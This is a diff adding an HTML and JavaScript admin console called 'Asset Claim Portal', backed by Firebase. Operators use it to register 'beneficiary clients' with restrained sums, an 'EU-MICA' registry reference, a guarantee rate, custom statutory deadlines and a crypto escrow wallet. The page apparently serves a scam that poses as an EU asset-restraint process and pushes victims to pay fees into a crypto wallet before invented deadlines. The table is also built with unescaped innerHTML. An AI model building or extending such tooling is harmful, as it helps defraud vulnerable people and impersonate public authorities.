@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Asset Claim Portal - Admin Management Dashboard</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+:root {
+  --eu-blue: #003399;
+  --bg-light: #f8fafc;
+  --border: #cbd5e1;
+  --danger: #d43c39;
+  --success: #2e7d32;
+}
+
+body {
+  font-family: 'Roboto', sans-serif;
+  margin: 0;
+  background-color: #f1f5f9;
+  color: #1e293b;
+}
+
+header {
+  background: var(--eu-blue);
+  color: #fff;
+  padding: 15px 5%;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.admin-container {
+  max-width: 1200px;
+  margin: 30px auto;
+  padding: 0 20px;
+}
+
+.card {
+  background: #fff;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 25px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+  margin-bottom: 30px;
+}
+
+h2 { margin-top: 0; color: var(--eu-blue); }
+
+.form-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 15px;
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.form-group.full { grid-column: span 3; }
+
+label { font-size: 13px; font-weight: 700; }
+
+input, select {
+  padding: 10px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  font-size: 14px;
+  box-sizing: border-box;
+}
+
+.btn-submit {
+  background: var(--eu-blue);
+  color: #fff;
+  border: none;
+  padding: 12px 20px;
+  font-weight: 700;
+  border-radius: 4px;
+  cursor: pointer;
+  margin-top: 15px;
+}
+
+.btn-submit:hover { background: #002673; }
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin-top: 15px;
+  font-size: 13px;
+}
+
+th, td {
+  padding: 12px;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+}
+
+th { background: #f1f5f9; color: #475569; text-transform: uppercase; }
+
+.btn-del {
+  background: var(--danger);
+  color: #fff;
+  border: none;
+  padding: 6px 10px;
+  border-radius: 3px;
+  cursor: pointer;
+}
+
+.badge-deadline {
+  background: #fef3c7;
+  color: #92400e;
+  padding: 2px 6px;
+  border-radius: 3px;
+  font-weight: bold;
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div style="display:flex; align-items:center; gap:15px;">
+    <i class="fas fa-user-shield" style="font-size: 24px;"></i>
+    <h1 style="margin:0; font-size:18px;">Asset Claim Portal — Admin Console</h1>
+  </div>
+</header>
+
+<div class="admin-container">
+
+  <!-- ADD CLIENT FORM -->
+  <div class="card">
+    <h2><i class="fas fa-user-plus"></i> Add New Beneficiary Client</h2>
+    <form id="addClientForm" onsubmit="saveClient(event)">
+      <div class="form-grid">
+        <div class="form-group">
+          <label>Full Legal Name</label>
+          <input type="text" id="admName" placeholder="John Doe" required>
+        </div>
+        <div class="form-group">
+          <label>Email Address (Unique ID)</label>
+          <input type="email" id="admEmail" placeholder="john@example.com" required>
+        </div>
+        <div class="form-group">
+          <label>Registry Reference</label>
+          <input type="text" id="admRef" placeholder="EU-MICA-8829123-00" required>
+        </div>
+        <div class="form-group">
+          <label>Date of Restraint</label>
+          <input type="text" id="admDate" placeholder="September 7th, 2026" required>
+        </div>
+        <div class="form-group">
+          <label>Currency</label>
+          <select id="admCurrency">
+            <option value="EUR">EUR (€)</option>
+            <option value="USD">USD ($)</option>
+            <option value="GBP">GBP (£)</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Restrained Amount</label>
+          <input type="number" id="admAmount" placeholder="108357" step="0.01" required>
+        </div>
+        <div class="form-group">
+          <label>Guarantee Rate (%)</label>
+          <input type="number" id="admRate" placeholder="6.5" step="0.1" value="6.5" required>
+        </div>
+        <div class="form-group">
+          <label>Custom Statutory Deadline Date</label>
+          <input type="text" id="admDeadline" placeholder="October 15th, 2026 at 23:59 CET">
+        </div>
+        <div class="form-group full">
+          <label>Escrow Wallet Address</label>
+          <input type="text" id="admWallet" placeholder="0xc000f1C17B99c1902A503fF2E1E7d51C9791718b" required>
+        </div>
+      </div>
+      <button type="submit" class="btn-submit"><i class="fas fa-save"></i> Save Client to Database</button>
+    </form>
+  </div>
+
+  <!-- REGISTERED CLIENTS TABLE -->
+  <div class="card">
+    <h2><i class="fas fa-database"></i> Registered Beneficiaries (<span id="clientCount">0</span>)</h2>
+    <div style="overflow-x:auto;">
+      <table>
+        <thead>
+          <tr>
+            <th>Name</th>
+            <th>Email</th>
+            <th>Restrained Balance</th>
+            <th>Restraint Date</th>
+            <th>Custom Deadline</th>
+            <th>Action</th>
+          </tr>
+        </thead>
+        <tbody id="clientTableBody"></tbody>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<!-- FIREBASE SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+<script>
+// REPLACE WITH YOUR NEW FIREBASE PROJECT CONFIG KEYS
+const firebaseConfig = {
+  apiKey: "YOUR_NEW_PROJECT_API_KEY",
+  authDomain: "YOUR_NEW_PROJECT_ID.firebaseapp.com",
+  projectId: "YOUR_NEW_PROJECT_ID",
+  storageBucket: "YOUR_NEW_PROJECT_ID.firebasestorage.app",
+  messagingSenderId: "YOUR_NEW_PROJECT_SENDER_ID",
+  appId: "YOUR_NEW_PROJECT_APP_ID"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// LOAD CLIENTS REAL-TIME
+db.collection("claim_clients").onSnapshot((snapshot) => {
+  const tbody = document.getElementById('clientTableBody');
+  tbody.innerHTML = '';
+  let count = 0;
+
+  snapshot.forEach((doc) => {
+    count++;
+    const client = doc.data();
+    const email = doc.id;
+    const currencySymbols = { EUR: "€", USD: "$", GBP: "£" };
+    const sym = currencySymbols[client.currency] || "€";
+
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td><strong>${client.name}</strong></td>
+      <td>${email}</td>
+      <td>${sym}${Number(client.restrainedAmount).toLocaleString('en-US', {minimumFractionDigits: 2})} (${client.currency})</td>
+      <td>${client.date}</td>
+      <td><span class="badge-deadline">${client.deadline || 'Auto-Calculated'}</span></td>
+      <td>
+        <button onclick="deleteClient('${email}')" class="btn-del"><i class="fas fa-trash"></i> Delete</button>
+      </td>
+    `;
+    tbody.appendChild(tr);
+  });
+
+  document.getElementById('clientCount').innerText = count;
+});
+
+async function saveClient(e) {
+  e.preventDefault();
+  const email = document.getElementById('admEmail').value.trim().toLowerCase();
+
+  const clientData = {
+    name: document.getElementById('admName').value.trim(),
+    email: email,
+    ref: document.getElementById('admRef').value.trim(),
+    date: document.getElementById('admDate').value.trim(),
+    currency: document.getElementById('admCurrency').value,
+    restrainedAmount: Number(document.getElementById('admAmount').value),
+    guaranteeRate: Number(document.getElementById('admRate').value) / 100,
+    deadline: document.getElementById('admDeadline').value.trim(), // CUSTOM DEADLINE DATE
+    wallet: document.getElementById('admWallet').value.trim()
+  };
+
+  try {
+    await db.collection("claim_clients").doc(email).set(clientData);
+    alert("Client successfully saved to Cloud Database!");
+    e.target.reset();
+  } catch (err) {
+    alert("Error saving client: " + err.message);
+  }
+}
+
+async function deleteClient(email) {
+  if (confirm(`Delete ${email} permanently?`)) {
+    try {
+      await db.collection("claim_clients").doc(email).delete();
+    } catch (err) {
+      console.error(err);
+    }
+  }
+}
+</script>
+</body>
+</html>
